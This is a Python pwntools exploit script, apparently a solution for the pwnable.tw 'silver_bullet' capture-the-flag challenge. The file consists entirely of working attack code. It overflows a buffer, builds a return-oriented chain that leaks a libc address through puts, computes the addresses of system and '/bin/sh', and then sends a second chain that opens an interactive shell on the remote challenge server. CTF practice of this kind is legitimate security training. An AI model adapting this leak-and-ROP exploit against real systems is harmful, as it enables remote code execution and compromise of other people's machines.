#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10103)
else:
    conn = process('/home/doublesine/Desktop/silver_bullet')

def connRead():
    sleep(1)
    read = conn.read()
    print read,
    return read

def connSendRaw(s):
    conn.send_raw(s)
    print s,

puts_addr = 0x080484A8
main_addr = 0x08048954
exit_GOT_PLT_addr = 0x0804AFE4

libc_exit_addr = 0x0002E7B0
libc_system_addr = 0x0003A940
libc_binsh_str_addr = 0x00158E8B

# create a silver bullet
connRead()
connSendRaw('1\n')
connRead()
connSendRaw('a' * 47 + '\n')

# power up silver bullet
connRead()
connSendRaw('2\n')
connRead()
connSendRaw('a\n')

# power up silver bullet again,
# but this time, we can append 47 chars
connRead()
connSendRaw('2\n')
connRead()
connSendRaw('\xA0\xA0\xA0' + 'fuck' + pack(puts_addr, 32) + pack(main_addr, 32) + pack(exit_GOT_PLT_addr, 32) + '\n')

# beat werewolf to get leak data and return 'main' again
connRead()
connSendRaw('3\n')
sleep(2)
read0 = conn.readuntil('Oh ! You win !!\n')
read1 = conn.readuntil('+++++++++++++++++++++++++++\n')
read2 = conn.read()

leak_data = read1[0:-28]
print(leak_data.__repr__())
libc_reloc_offset = unpack(leak_data[0:4], 32) - libc_exit_addr
libc_exit_addr += libc_reloc_offset
libc_system_addr += libc_reloc_offset
libc_binsh_str_addr += libc_reloc_offset
print('libc_reloc_offset = 0x%08x' % libc_reloc_offset)
print('libc_exit_addr = 0x%08x' % libc_exit_addr)
print('libc_system_addr = 0x%08x' % libc_system_addr)
print('libc_binsh_str_addr = 0x%08x' % libc_binsh_str_addr)

print read0,
print read1,
print read2,

# now it is time to exploit it
# create a silver bullet
connSendRaw('1\n')
connRead()
connSendRaw('a' * 47 + '\n')

# power up silver bullet
connRead()
connSendRaw('2\n')
connRead()
connSendRaw('a\n')

# power up silver bullet again,
# but this time, we can append 47 chars
connRead()
connSendRaw('2\n')
connRead()
connSendRaw('\xA0\xA0\xA0' + 'fuck' + pack(libc_system_addr, 32) + pack(main_addr, 32) + pack(libc_binsh_str_addr, 32) + '\n')

# beat werewolf to get shell
connRead()
connSendRaw('3\n')
sleep(2)
connRead()

conn.interactive()  # you will get shell here
conn.close()
